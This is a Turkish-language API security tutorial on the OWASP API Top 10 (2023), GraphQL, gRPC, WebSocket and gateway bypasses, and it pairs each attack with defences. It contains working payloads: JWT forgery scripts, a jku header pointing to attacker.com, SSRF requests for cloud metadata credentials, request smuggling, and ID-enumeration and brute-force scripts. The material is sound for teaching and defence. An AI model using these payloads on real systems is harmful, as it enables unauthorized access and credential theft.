**API Security**, klasik web uygulaması güvenliğinden farklı bir disiplindir. Bir web sayfası kullanıcıya sınırlı bir arayüz sunarken, bir API genellikle **her fonksiyonu, her veri modelini ve her iş akışını doğrudan dışarıya açar**. Bu yüzden API'lerde saldırı yüzeyi çok daha geniştir ve hatalar çok daha kolay istismar edilebilir hale gelir.

OWASP, bu farkı gözeterek **API Security Top 10**'u klasik OWASP Top 10'dan ayrı bir liste olarak yayınlar. 2023 revizyonu, 2019 listesine göre önemli değişiklikler içerir: bazı kategoriler birleştirilmiş (Excessive Data Exposure + Mass Assignment → Broken Object Property Level Authorization), bazıları tamamen yeni eklenmiştir (Unrestricted Resource Consumption, Unrestricted Access to Sensitive Business Flows, Unsafe Consumption of APIs).

Bu yazıda listenin her bir maddesini, gerçek payload örnekleri, zafiyetli/güvenli kod karşılaştırmaları ve ileri seviye istismar teknikleriyle birlikte inceleyeceğiz.

---

## API1:2023 — Broken Object Level Authorization (BOLA)

BOLA, API dünyasının en yaygın ve en yıkıcı zafiyetidir. Web tarafındaki karşılığı IDOR'dur, ancak API'lerde her endpoint doğrudan bir nesne/kaynak ID'si üzerinden çalıştığı için etki alanı çok daha geniştir.

```
GET /api/v1/orders/8841
Authorization: Bearer <kullanici_A_token>
```

Backend `8841` numaralı siparişin gerçekten istek sahibine ait olup olmadığını kontrol etmezse, saldırgan sadece ID'yi değiştirerek başka kullanıcıların verisine ulaşır.

### Gelişmiş BOLA Teknikleri

**Nested (İç İçe) Kaynak Manipülasyonu:** Modern API'ler genellikle kaynakları hiyerarşik olarak sunar. Yetki kontrolü çoğu zaman sadece **üst seviyede** yapılır, alt kaynaklarda unutulur.

```
GET /api/v1/companies/12/departments/5/employees/301
```

Eğer sunucu sadece `companies/12`'nin istek sahibine ait olup olmadığını kontrol edip, `departments/5` ve `employees/301` değerlerinin gerçekten `companies/12`'ye bağlı olduğunu doğrulamazsa, saldırgan bu ID'leri farklı şirketlere ait değerlerle değiştirerek çapraz erişim sağlayabilir:

```
GET /api/v1/companies/12/departments/9931/employees/77482
```

Burada `9931` ve `77482`, aslında `company 45`'e ait olabilir — ancak URL'nin başında saldırganın kendi `companies/12` ID'si göründüğü için yüzeysel kontroller bunu "kendi verisi" sanabilir.

**Array-Based ID Enjeksiyonu:** Toplu işlem yapan endpoint'lerde ID'ler dizi olarak gönderilir. Yetki kontrolü dizinin sadece ilk elemanında yapılıyorsa, geri kalanlar sızabilir.

```json
POST /api/v1/invoices/batch-export
{
  "invoice_ids": [8841, 8842, 55210, 55211]
}
```

**UUID Tahmini/Sızdırma:** UUIDv1 zaman damgası + MAC adresinden türetildiği için, kayıt oluşturulma zamanı biliniyorsa arama uzayı ciddi şekilde daraltılabilir. Ayrıca liste (`GET /api/v1/resources`) endpoint'leri yetki filtresi olmadan tüm UUID'leri döndürüyorsa, "tahmin edilemez ID" savunması tamamen anlamsızlaşır.

```python
for i in range(1, 100000):
    r = requests.get(f"https://api.target.com/v1/orders/{i}", headers=headers)
    if r.status_code == 200:
        print(f"Erişildi: {i}")
```

### Savunma

```javascript
// ❌ Riskli
app.get('/api/v1/orders/:id', async (req, res) => {
  const order = await Order.findById(req.params.id);
  res.json(order);
});

// ✅ Güvenli — sahiplik kontrolü query'ye dahil
app.get('/api/v1/orders/:id', async (req, res) => {
  const order = await Order.findOne({ _id: req.params.id, ownerId: req.user.id });
  if (!order) return res.status(403).json({ error: 'Yetkisiz erişim' });
  res.json(order);
});
```

---

## API2:2023 — Broken Authentication

Kimlik doğrulama mekanizmalarının zayıf tasarımı veya hatalı implementasyonu, saldırganın başka kullanıcıların kimliğini geçici veya kalıcı olarak ele geçirmesine izin verir.

### JWT Atakları

**`alg: none` Saldırısı:** Sunucu, header'daki `alg` değerini doğrulamadan işlemi kabul ediyorsa, saldırgan imza doğrulamasını tamamen devre dışı bırakabilir.

```json
{ "alg": "none", "typ": "JWT" }
```

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user_id":1,"role":"admin"}).encode()).rstrip(b'=')
token = header + b'.' + payload + b'.'
print(token.decode())
```

**Algoritma Karışıklığı (Key Confusion — RS256 → HS256):** Sunucu RS256 (asimetrik) bekliyor ama doğrulama kodu hem RS256 hem HS256'yı kabul edecek şekilde yazılmışsa, saldırgan public key'i HMAC secret'ı olarak kullanıp geçerli görünen sahte bir token üretebilir:

```python
import jwt

public_key = open("server_public_key.pem").read()
forged_token = jwt.encode(
    {"user_id": 1, "role": "admin"},
    public_key,
    algorithm="HS256"
)
```

**Zayıf Secret Brute-Force:** HS256 imzalı token'larda secret zayıfsa (`secret`, `123456`, şirket adı vb.) offline brute-force ile kırılabilir:

```bash
python3 jwt_tool.py <token> -C -d rockyou.txt
```

**JWKS Enjeksiyonu:** Bazı sunucular, token header'ındaki `jku` (JWK Set URL) veya `kid` (Key ID) alanını doğrulamadan kullanır. Saldırgan `jku` değerini kendi kontrolündeki bir sunucuya işaret edecek şekilde değiştirip, o adreste kendi ürettiği public key'i barındırırsa, sunucu saldırganın imzasını "geçerli" olarak kabul eder.

```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/.well-known/jwks.json",
  "kid": "attacker-key-1"
}
```

### OAuth 2.0 / OIDC Zafiyetleri

**State Parametresi Eksikliği (CSRF):** Yetkilendirme akışında `state` parametresi kullanılmıyor veya doğrulanmıyorsa, saldırgan kendi authorization code'unu kurbanın oturumuna bağlayarak hesap ele geçirme (account takeover) gerçekleştirebilir.

**`redirect_uri` Manipülasyonu:** Sunucu `redirect_uri`'yi tam eşleşme yerine gevşek (prefix/substring) kontrol ediyorsa:

```
https://accounts.target.com/oauth/authorize?
  client_id=abc123&
  redirect_uri=https://app.target.com.attacker.com/callback&
  response_type=code&
  scope=profile
```

Authorization code, saldırganın kontrolündeki domaine yönlendirilir ve token'a çevrilebilir.

**Authorization Code Interception:** PKCE (Proof Key for Code Exchange) kullanılmıyorsa, mobil/native uygulamalarda code, uygulama içi tarayıcı veya log üzerinden sızabilir; saldırgan bu code'u kendi client'ıyla token'a çevirebilir.

### Savunma

* JWT için `alg` header'ını sunucu tarafında sabitleyip whitelist yapın (`HS256` bekleniyorsa `RS256`/`none` reddedilmeli)
* `jku`/`jwk` gibi dışarıdan gelen anahtar referanslarını asla doğrulamadan güvenmeyin — sabit, önceden tanımlı key set kullanın
* OAuth akışlarında `state` zorunlu olsun ve session'a bağlı doğrulansın
* `redirect_uri` **tam eşleşme (exact match)** ile kontrol edilsin, whitelist dışına asla izin verilmesin
* Mobil/SPA istemcilerde PKCE zorunlu tutulsun

---

## API3:2023 — Broken Object Property Level Authorization

2019 listesindeki **Excessive Data Exposure** ve **Mass Assignment** kategorilerinin birleşimidir. Ortak kök neden: yetkilendirme kontrolü nesne (object) seviyesinde yapılsa da, **nesnenin içindeki tekil alanlar (property)** seviyesinde yapılmaz.

### Excessive Data Exposure (Aşırı Veri Sızıntısı)

Backend, veritabanı nesnesini olduğu gibi frontend'e dönerse, istemcinin göstermediği ama response'da bulunan alanlar sızar:

```json
GET /api/v1/users/44

{
  "id": 44,
  "name": "Ahmet",
  "email": "ahmet@mail.com",
  "password_hash": "$2b$12$...",
  "internal_credit_score": 812,
  "is_admin": false
}
```

Frontend sadece `name` ve `email`'i gösterse bile, response'un tamamı network sekmesinde/API log'unda görünür durumdadır.

### Mass Assignment (Toplu Atama)

```json
PUT /api/v1/profile
{
  "name": "Ahmet",
  "email": "ahmet@mail.com",
  "is_admin": true,
  "account_balance": 999999
}
```

Backend gelen tüm alanları filtrelemeden nesneye yazıyorsa, saldırgan normalde erişemeyeceği alanları (`is_admin`, `account_balance`) değiştirerek doğrudan yetki yükseltmesi yapar.

### Savunma

```python
# ❌ Riskli: modelin tamamı response'a dönüyor, gelen tüm alanlar yazılıyor
@app.route('/api/v1/profile', methods=['PUT'])
def update_profile():
    user = User.query.get(current_user.id)
    for key, value in request.json.items():
        setattr(user, key, value)
    db.session.commit()
    return jsonify(user.__dict__)

# ✅ Güvenli: explicit whitelist — hem input hem output için
ALLOWED_INPUT = {"name", "email"}
ALLOWED_OUTPUT = {"id", "name", "email"}

@app.route('/api/v1/profile', methods=['PUT'])
def update_profile_secure():
    user = User.query.get(current_user.id)
    for key, value in request.json.items():
        if key in ALLOWED_INPUT:
            setattr(user, key, value)
    db.session.commit()
    return jsonify({k: getattr(user, k) for k in ALLOWED_OUTPUT})
```

Kural basittir: **DTO (Data Transfer Object) kullanın**, backend nesnesini asla doğrudan serialize edip dönmeyin veya doğrudan request body'sinden nesneye map etmeyin.

---

## API4:2023 — Unrestricted Resource Consumption

2019'daki "Lack of Resources & Rate Limiting" kategorisinin genişletilmiş hâlidir. Sadece istek sayısı değil; CPU, bellek, depolama, ağ bant genişliği ve ücretli üçüncü taraf entegrasyonları (SMS, e-posta, biyometrik doğrulama) da kaynak tüketimi kapsamındadır.

**Örnek saldırı vektörleri:**

* **Büyük payload saldırısı:** `limit` veya `page_size` parametresine aşırı büyük değer vererek sunucuyu aşırı veri döndürmeye zorlamak:

```
GET /api/v1/search?query=a&page_size=999999999
```

* **Pahalı işlemleri tetikleme:** PDF oluşturma, resim işleme, regex tabanlı arama gibi CPU-yoğun endpoint'leri paralel ve tekrar tekrar çağırarak DoS oluşturmak.
* **Maliyetli üçüncü taraf servisleri kötüye kullanma:** SMS/OTP gönderen bir endpoint'e rate limit yoksa, saldırgan binlerce SMS tetikleyip hem kurbanı rahatsız eder hem de şirkete doğrudan finansal zarar verir.

```
POST /api/v1/auth/send-otp
{ "phone": "+905xx1234567" }
```

Bu istek saniyede yüzlerce kez gönderilebiliyorsa, hem DoS hem de gerçek para maliyeti (SMS başına ücret) oluşur.

### Savunma

* Her endpoint için istek başına kaynak limiti (payload boyutu, sayfalama üst sınırı, timeout) tanımlayın
* Kullanıcı/IP bazlı rate limiting + maliyetli işlemler için ayrı, daha sıkı limitler uygulayın
* Üçüncü taraf servis çağıran endpoint'lerde günlük/saatlik kota uygulayın

---

## API5:2023 — Broken Function Level Authorization (BFLA)

BOLA "hangi veriye erişebiliyorum" sorusuyken, BFLA "hangi **fonksiyona** erişebiliyorum" sorusuyla ilgilidir. Karmaşık rol hiyerarşilerinde, yönetimsel fonksiyonlar ile normal kullanıcı fonksiyonları arasındaki ayrım net değilse ortaya çıkar.

```
GET /api/v1/users          → normal kullanıcı: 403 (beklenen)
GET /api/v1/admin/users    → normal kullanıcı: 200 (BFLA!)
```

Saldırgan genellikle HTTP metodu değiştirerek de bu korumayı atlatmaya çalışır:

```
DELETE /api/v1/users/44   → normal kullanıcı token'ıyla, admin-only fonksiyon
```

veya API dokümantasyonunda/JS bundle'ında referansı bulunan ama frontend'de gösterilmeyen "gizli" admin endpoint'lerini keşfederek:

```
POST /api/v1/internal/users/44/reset-password
```

### Savunma

* Fonksiyon seviyesinde yetkilendirmeyi merkezi bir middleware/guard katmanında zorunlu kılın, controller'a tek tek eklemeyin
* Rol bazlı erişim kontrolünü (RBAC) deny-by-default mantığıyla kurun: açıkça izin verilmeyen her fonksiyon reddedilsin
* Admin ve normal kullanıcı endpoint'lerini ayrı route prefix'leri + ayrı middleware zincirleriyle izole edin

---

## API6:2023 — Unrestricted Access to Sensitive Business Flows

Bu kategori, klasik bir "implementasyon hatası" değildir — **iş mantığının kötüye kullanıma karşı düşünülmemiş olmasıdır**. API teknik olarak doğru çalışır, ama otomatikleştirilmiş/aşırı kullanım işletmeye zarar verir.

**Örnek senaryolar:**

* **Bilet alım botları:** Konser bileti satan bir API, tek kullanıcının saniyede onlarca bilet satın almasını engellemiyorsa, botlar tüm stoku anında tüketir.
* **Yorum/oy spam'i:** `POST /api/v1/comments` endpoint'i CAPTCHA veya davranışsal kontrol içermiyorsa, otomatik script'lerle binlerce sahte yorum/oy üretilebilir.
* **Fiyat kazıma (scraping) + rekabet manipülasyonu:** Bir e-ticaret API'si fiyat bilgisini sınırsız sorgulamaya izin veriyorsa, rakip firmalar fiyatları anlık izleyip otomatik fiyat savaşı başlatabilir.
* **Hesap oluşturma spam'i:** Kayıt endpoint'i e-posta doğrulaması ve rate limit içermiyorsa, saldırgan binlerce sahte hesap oluşturup promosyon/referral sistemini istismar edebilir.

### Savunma

* Kritik iş akışlarını (satın alma, kayıt, oylama) sadece teknik değil **davranışsal** olarak da koruyun: hız, sıklık, cihaz parmak izi (fingerprint) analizleri
* CAPTCHA, bot tespiti (device fingerprinting, davranış analizi) kritik akışlara entegre edilsin
* İş biriminden (product/business) "bu fonksiyon otomatik/toplu kullanılırsa ne kaybederiz?" sorusunun güvenlik ekibiyle birlikte cevaplanması gerekir

---

## API7:2023 — Server Side Request Forgery (SSRF)

API'nin, kullanıcıdan gelen bir URI'yi doğrulamadan sunucu tarafında istek atması sonucu oluşur. Saldırgan, sunucuyu **kendi adına** normalde erişemeyeceği iç ağ kaynaklarına istek atmaya zorlar.

**Tipik zafiyetli senaryo — webhook/URL önizleme:**

```json
POST /api/v1/webhooks
{
  "callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

Sunucu bu URL'ye istek atarsa, AWS/Azure/GCP metadata servisi üzerinden **geçici IAM kimlik bilgileri** sızabilir — bu, bulut ortamlarında SSRF'in en kritik sonucudur.

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

Dönen yanıt genellikle `AccessKeyId`, `SecretAccessKey` ve `Token` içerir; bu bilgilerle saldırgan AWS CLI üzerinden bulut kaynaklarına doğrudan erişebilir.

**Dosya yükleme üzerinden SSRF:** Bazı API'ler "URL'den resim yükle" gibi bir özellik sunar:

```json
POST /api/v1/avatar/import
{ "image_url": "http://internal-admin-panel.local/export?format=json" }
```

Sunucu bu adrese istek atıp içeriği "resim" olarak işlemeye çalışırken, aslında iç ağdaki korumasız bir admin panelinin çıktısını saldırgana (hata mesajı, response süresi farkı vb. yollarla) sızdırabilir.

### Savunma

* Kullanıcıdan gelen URL'leri **whitelist** ile sınırlayın (sadece izin verilen domain/protokoller)
* Private IP aralıklarına (`127.0.0.1`, `169.254.169.254`, `10.0.0.0/8`, `192.168.0.0/16`) giden isteklerin sunucu seviyesinde engellenmesi
* Bulut ortamlarında IMDSv2 (token tabanlı metadata erişimi) zorunlu kılınmalı — düz IMDSv1 SSRF'e karşı korumasızdır
* DNS rebinding saldırılarına karşı, doğrulama anındaki IP ile isteğin gerçekten gittiği IP'nin aynı olduğunu teyit edin

---

## API8:2023 — Security Misconfiguration

API'lerin ve destekleyici altyapının karmaşık yapılandırma seçenekleri, güvenlik en iyi pratiklerine uyulmadığında geniş bir saldırı yüzeyi açar.

**Yaygın örnekler:**

* Gereksiz HTTP metodlarının açık bırakılması (`TRACE`, `PUT`, `DELETE` production'da kapatılmamış)
* Detaylı hata mesajları / stack trace'lerin production'da görünür olması
* CORS yapılandırmasının aşırı gevşek olması (`Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` birlikte kullanımı — kritik bir yanlış yapılandırma)
* Varsayılan (default) kimlik bilgileriyle açık kalmış admin/monitoring panelleri
* Güvenlik header'larının eksikliği (`Strict-Transport-Security`, `X-Content-Type-Options`)

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Bu kombinasyon teorik olarak tarayıcılar tarafından reddedilir, ancak bazı proxy/gateway katmanları veya eski tarayıcı davranışları nedeniyle credential içeren cross-origin isteklerin sızmasına yol açabilecek yapılandırma hataları hâlâ karşımıza çıkar.

### Savunma

* Konfigürasyonları kod gibi versiyonlayın (Infrastructure as Code) ve otomatik güvenlik taramasından geçirin
* Production ortamında debug modunu ve detaylı hata çıktısını kesinlikle kapatın
* CORS politikasını explicit whitelist ile tanımlayın, `*` + credentials kombinasyonundan kaçının
* Düzenli konfigürasyon denetimi (hardening checklist) sürecini CI/CD'ye entegre edin

---

## API9:2023 — Improper Inventory Management

API'ler, geleneksel web uygulamalarına göre çok daha fazla endpoint açığa çıkarır ve versiyonlama süreçleri karmaşıklaştıkça **hangi API'nin hâlâ aktif olduğunu takip etmek zorlaşır.**

**Tipik senaryolar:**

* Eski API versiyonlarının (`/v1/`) yeni versiyon (`/v2/`) yayına alındıktan sonra kapatılmaması — genellikle `/v1/` daha az güvenlik güncellemesi almıştır ve zafiyetli kalır.
* Test/staging ortamlarının production domain altında unutulmuş olması (`api-staging.target.com`, `api-dev.target.com`)
* Debug/internal amaçlı eklenip kaldırılması unutulan endpoint'ler (`/api/v1/debug/dump-db`)
* Aynı API'ye erişen farklı istemcilerin (mobil app, web, partner entegrasyonu) farklı yetkilendirme seviyeleri kullanması ve bu farkın belgelenmemesi

**Keşif teknikleri:**

```bash
# Subdomain/versiyon taraması
subfinder -d target.com | grep -i api
```

```bash
# JS bundle içinde gizli endpoint referanslarını arama
grep -rEo '"/api/v[0-9]+/[a-zA-Z0-9_/-]+"' bundle.js | sort -u
```

Swagger/OpenAPI dosyalarının erişilebilir bırakılması (`/swagger.json`, `/api-docs`) da tam bir endpoint envanteri sunarak saldırganın işini kolaylaştırır — bu dosyalar production'da ya kapatılmalı ya da kimlik doğrulama arkasına alınmalıdır.

### Savunma

* Merkezi bir API envanteri (host, versiyon, sahip ekip, yetkilendirme modeli) tutun ve düzenli güncelleyin
* Kullanılmayan/eski API versiyonlarını aktif olarak kapatın, sadece "gizlemeyin"
* Tüm ortamlar (dev/staging/prod) için erişim kontrolü ve güvenlik standardı aynı seviyede tutulmalı
* Otomatik API keşif taramalarını (DAST + envanter karşılaştırma) periyodik olarak çalıştırın

---

## API10:2023 — Unsafe Consumption of APIs

Geliştiriciler genellikle kullanıcı girdisine şüpheyle yaklaşırken, **üçüncü taraf API'lerden gelen veriye** aynı titizliği göstermez. Saldırganlar bu asimetriyi hedefleyerek, entegre edilen dış servisi ele geçirip veya taklit edip hedef API'ye ulaşır.

**Tipik zafiyetli senaryo:**

```python
# ❌ Riskli: üçüncü taraf API yanıtı doğrudan işleniyor, doğrulama yok
response = requests.get("https://partner-api.example.com/user-data")
data = response.json()
db.execute(f"INSERT INTO logs (info) VALUES ('{data['note']}')")  # SQL Injection riski
```

Burada geliştirici "bu veri güvenilir bir partnerden geliyor" varsayımıyla, gelen veriyi hiç doğrulamadan hem SQL sorgusuna hem de muhtemelen frontend'e (XSS riski) aktarır. Eğer partner API ele geçirilirse veya araya bir MITM (man-in-the-middle) girerse, saldırgan zincirleme olarak hedef sisteme kadar ulaşabilir.

**Diğer riskler:**

* TLS sertifika doğrulamasının üçüncü taraf istekleri için gevşetilmesi (`verify=False`)
* Redirect zincirlerinin sınırsız takip edilmesi (üçüncü taraf API'yi taklit eden bir redirect zinciriyle SSRF benzeri sonuçlar)
* Üçüncü taraf API'den gelen dosya/URL referanslarının doğrudan işlenmesi

### Savunma

```python
# ✅ Güvenli: gelen veri şema doğrulamasından geçiriliyor, parametrize sorgu kullanılıyor
import jsonschema

schema = {"type": "object", "properties": {"note": {"type": "string", "maxLength": 200}}}
response = requests.get("https://partner-api.example.com/user-data", timeout=5)
data = response.json()
jsonschema.validate(data, schema)

db.execute("INSERT INTO logs (info) VALUES (%s)", (data["note"],))
```

* Üçüncü taraf API yanıtlarını **kullanıcı girdisi gibi** ele alın: doğrulayın, sanitize edin, şema kontrolü uygulayın
* TLS doğrulamasını asla devre dışı bırakmayın, sertifika pinning değerlendirin
* Redirect takibini sınırlayın ve hedef domaini whitelist ile kontrol edin

---

## Mimari ve Protokol Bazlı İleri Seviye Zafiyetler

### GraphQL Pentest

GraphQL, REST'ten farklı olarak tek bir endpoint (`/graphql`) üzerinden esnek sorgular kabul eder — bu esneklik, klasik REST güvenlik kontrollerinin doğrudan uygulanmasını zorlaştırır.

**Introspection İstismarı:** Production'da introspection kapatılmamışsa, saldırgan tüm şemayı (tip, alan, mutation) tek sorguyla çıkarabilir:

```graphql
query {
  __schema {
    types {
      name
      fields { name type { name } }
    }
  }
}
```

Bu, saldırgana tüm API yüzeyinin haritasını — gizli mutation'lar, hassas alanlar dahil — sunar.

**Derin/İç İçe Sorgu (Circular Query) DoS:** GraphQL'de ilişkili tipler birbirine referans verebilir. Derinlik sınırı yoksa, saldırgan iç içe geçmiş bir sorgu ile sunucuyu üstel karmaşıklıkta bir işleme zorlayabilir:

```graphql
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends { name }
        }
      }
    }
  }
}
```

**Batching ile Rate-Limit Atlatma:** GraphQL, tek HTTP isteğinde birden fazla sorguyu "alias" ile birleştirmeye izin verir. Rate limit istek sayısına göre çalışıyorsa, saldırgan tek istekte yüzlerce login denemesi gönderebilir:

```graphql
query {
  a1: login(username: "admin", password: "123456") { token }
  a2: login(username: "admin", password: "password") { token }
  a3: login(username: "admin", password: "admin123") { token }
  # ... yüzlerce alias
}
```

Bu tek bir HTTP isteği olduğu için IP/istek bazlı rate limiter'ı görünürde hiç tetiklemez.

**GraphQL Injection:** Resolver fonksiyonu, gelen argümanı doğrudan bir veritabanı sorgusuna (SQL/NoSQL) string olarak birleştiriyorsa, klasik injection mantığı GraphQL üzerinden de çalışır.

**Savunma:**

* Production'da introspection kapatılmalı
* Sorgu derinliği (`max query depth`) ve karmaşıklık (`query cost analysis`) sınırlandırılmalı
* Rate limiting, HTTP istek sayısı yerine **sorgu/alias sayısına** göre de hesaplanmalı
* Resolver'larda parametrized query / ORM kullanımı zorunlu tutulmalı

---

### gRPC ve WebSocket Güvenliği

**gRPC:** HTTP/2 üzerinde çalışan, Protobuf (Protocol Buffers) ile serileştirilmiş ikili bir protokoldür. REST'e göre daha az insan-okur formatta olduğu için test araçları (Burp gibi) doğrudan destek vermeyebilir.

Test yaklaşımı:

```bash
# .proto dosyası biliniyorsa doğrudan kullanılır
grpcurl -plaintext -d '{"user_id": 1044}' target.com:50051 UserService/GetUser
```

`.proto` tanımı elde edilemiyorsa, **server reflection** açıksa servis tanımı doğrudan sorgulanabilir:

```bash
grpcurl -plaintext target.com:50051 list
grpcurl -plaintext target.com:50051 describe UserService
```

Reflection kapalıysa, ikili trafik yakalanıp (mitmproxy + gRPC eklentisi) Protobuf mesaj yapısı tersine mühendislikle çıkarılmaya çalışılır — alan numaraları ve wire type'lar analiz edilerek şema kısmen yeniden inşa edilir.

Yetkilendirme açısından gRPC servisleri de REST kadar BOLA/BFLA'ya açıktır; fark sadece taşıma formatındadır — güvenlik mantığı aynıdır.

**WebSocket:** Kalıcı, çift yönlü bağlantı olduğu için klasik istek/yanıt tabanlı güvenlik kontrolleri (CSRF token, her istekte yeniden authentication) genellikle bağlantı kurulum anında yapılır ve **bağlantı boyunca tekrar doğrulanmaz**.

```javascript
const ws = new WebSocket("wss://target.com/ws?token=" + stolenToken);
ws.onopen = () => {
  ws.send(JSON.stringify({ action: "get_messages", user_id: 1045 }));
};
```

Bağlantı bir kez kurulduktan sonra, saldırgan mesaj içindeki `user_id` gibi parametreleri değiştirerek WebSocket üzerinden de BOLA gerçekleştirebilir — çünkü sunucu genellikle her mesajda değil, sadece handshake anında yetki kontrolü yapar.

**Savunma:**

* gRPC'de production'da server reflection kapatılmalı, mTLS ile servisler arası kimlik doğrulama zorunlu tutulmalı
* WebSocket mesajlarında da **her action için** sunucu tarafı yetki kontrolü yapılmalı, sadece handshake yeterli görülmemeli
* Her iki protokolde de input validation ve rate limiting, REST kadar titizlikle uygulanmalı

---

## Altyapı ve Atlatma (Bypass) Teknikleri

### API Gateway / WAF Atlatma

**Parametre Kirliliği (HPP):** Gateway ile backend farklı parametre yorumlama mantığına sahipse, WAF ilk değeri kontrol edip backend ikincisini işleyebilir:

```
POST /api/v1/transfer?amount=10&amount=100000
```

**HTTP Request Smuggling:** Gateway ve backend sunucu, `Content-Length` ve `Transfer-Encoding` header'larını farklı yorumluyorsa, tek TCP bağlantısında **iki farklı istek** gizlenebilir — biri WAF tarafından görülür ve onaylanır, diğeri backend'e "gizlice" ulaşır.

```
POST /api/v1/data HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /api/v1/admin/users HTTP/1.1
Host: target.com
```

**Parser Farklılıkları:** WAF JSON body'yi belirli bir şekilde parse edip kontrol ederken, backend farklı bir kütüphane/ayar kullanıyorsa (örn. yinelenen key'lerde WAF ilkini, backend sonuncusunu alıyorsa), zararlı payload ikinci key içine gizlenebilir:

```json
{ "role": "user", "role": "admin" }
```

**IP Rotasyonu ile Filtre Atlatma:** IP bazlı WAF kuralları (rate limit, coğrafi engel) varsa, saldırgan proxy/VPN havuzları veya bulut fonksiyonları (her istek farklı IP'den) kullanarak filtreyi etkisiz hale getirebilir.

### Rate Limit Atlatma

**Header Manipülasyonu:** Rate limiter, gerçek istemci IP'sini `X-Forwarded-For` header'ından alıyorsa ve bu header doğrulanmıyorsa:

```
X-Forwarded-For: 1.2.3.4
X-Forwarded-For: 5.6.7.8
X-Real-IP: 9.10.11.12
```

Her istekte farklı bir değer göndererek limiter'ın "yeni istemci" sanmasını sağlamak mümkün olabilir.

**Boşluk/Encoding Manipülasyonu:** Bazı rate limiter'lar, endpoint yolunu **birebir string eşleşmesiyle** takip eder. Yol sonuna encode edilmiş boşluk veya farklı case ekleyerek limiter'ın farklı bir endpoint sandığı durumlar oluşabilir:

```
POST /api/v1/login
POST /api/v1/login/
POST /API/v1/LOGIN
POST /api/v1/login%20
```

**Login/OTP Mantık Hataları:** OTP doğrulama endpoint'i, deneme sayısını `user_id` yerine `session_id` bazında sayıyorsa, saldırgan her denemede yeni bir session başlatarak deneme sayısı limitini anlamsız hale getirebilir.

### Savunma

* Gateway ve backend'in HTTP parse davranışlarını **standartlaştırın** (aynı kütüphane/versiyon veya sıkı RFC uyumu)
* Rate limiting'i güvenilmeyen header'lara (`X-Forwarded-For`) değil, TLS bağlantı bilgisi + authenticated user ID'ye göre uygulayın
* Endpoint normalizasyonunu (trailing slash, case, encoding) gateway seviyesinde tek bir noktada yapın
* OTP/login deneme sayacını **kullanıcı hesabına** bağlayın, session'a değil

---

## SSRF — Bulut Metadata Servisleri Üzerinden Derinlemesine

API7 bölümünde değinilen SSRF'in bulut ortamlarındaki etkisi, API güvenliğinde ayrı bir başlığı hak edecek kadar kritiktir çünkü **doğrudan altyapı kimlik bilgilerinin sızmasına** yol açabilir.

| Bulut Sağlayıcı | Metadata Endpoint |
|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

Azure ve GCP metadata servisleri ek bir header zorunlu kıldığı için (`Metadata: true` / `Metadata-Flavor: Google`), SSRF zafiyeti sadece URL'i kontrol edebiliyorsa ama header ekleyemiyorsa bu sağlayıcılarda daha zor istismar edilir — bu da SSRF savunmasında "hangi bulutta çalışıyoruz" bilgisinin önemini gösterir.

```
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Metadata-Flavor: Google
```

**Savunma:** IMDSv2 (AWS) gibi token-tabanlı, PUT isteğiyle önce token alınmasını zorunlu kılan mekanizmalar, klasik tek-GET-isteği SSRF saldırılarını büyük ölçüde etkisiz hale getirir — bu yüzden IMDSv1'in tamamen kapatılması önerilir.

---

## Kod Analizi ve Otomasyon (DevSecOps)

### White-Box API Pentest

Kaynak koda erişim varsa, rota (route) keşfi ve mantıksal hata tespiti kara kutu teste göre çok daha hızlı ve kapsamlıdır.

**Node.js (Express) route keşfi:**

```bash
grep -rEn "router\.(get|post|put|delete|patch)\(" src/ | sort
```

**Go route keşfi (Gin/Echo):**

```bash
grep -rEn "\.(GET|POST|PUT|DELETE|PATCH)\(" --include="*.go" .
```

**Python (FastAPI/Flask) route keşfi:**

```bash
grep -rEn "@app\.(route|get|post|put|delete)" .
```

Bu şekilde çıkarılan tüm endpoint listesi, ardından her birinin yetkilendirme decorator'ı/middleware'i olup olmadığı kontrol edilerek BFLA/BOLA adayları hızlıca daraltılır:

```bash
# Yetki middleware'i olmayan route'ları bulmaya yönelik basit bir ön filtre
grep -B2 -E "\.(get|post|put|delete)\(" src/routes/*.js | grep -v "authMiddleware\|requireAuth"
```

### Özel Script ile Karmaşık API Akışlarını Simüle Etme

Standart araçlar (Burp, ZAP) çok adımlı, stateful akışları (örn. OAuth login → token alma → nested resource erişimi → sonuç doğrulama) otomatikleştirmekte zorlanabilir. Bu durumda özel script yazmak gerekir.

```python
import asyncio
import aiohttp

BASE = "https://api.target.com"

async def login(session, username, password):
    async with session.post(f"{BASE}/auth/login", json={"username": username, "password": password}) as r:
        data = await r.json()
        return data["token"]

async def test_bola(session, token, resource_ids):
    headers = {"Authorization": f"Bearer {token}"}
    results = []
    for rid in resource_ids:
        async with session.get(f"{BASE}/v1/orders/{rid}", headers=headers) as r:
            if r.status == 200:
                results.append(rid)
    return results

async def main():
    async with aiohttp.ClientSession() as session:
        token = await login(session, "userB", "test1234")
        leaked = await test_bola(session, token, range(1000, 2000))
        print(f"[+] Erişilebilen kayıt sayısı: {len(leaked)} -> {leaked[:20]}")

asyncio.run(main())
```

Go ile yazılan eşdeğerleri, yüksek eşzamanlılık gerektiren büyük ölçekli taramalarda (goroutine'lerin hafifliği sayesinde) genellikle daha performanslıdır ve CI/CD pipeline'larına entegre "sürekli yetkilendirme testi" (continuous authorization testing) adımı olarak eklenebilir.

**Önemli not:** Bu tür özel script'ler yalnızca **yetkilendirilmiş pentest kapsamındaki** hedeflerde, tanımlı kural ve kapsam (scope) dahilinde kullanılmalıdır. İzin alınmamış sistemlerde toplu tarama/istismar denemesi hem yasal hem etik ihlaldir.

---

## Genel Kural

> API güvenliği, tek bir güvenlik duvarı veya tek bir kontrol noktasıyla çözülemez.
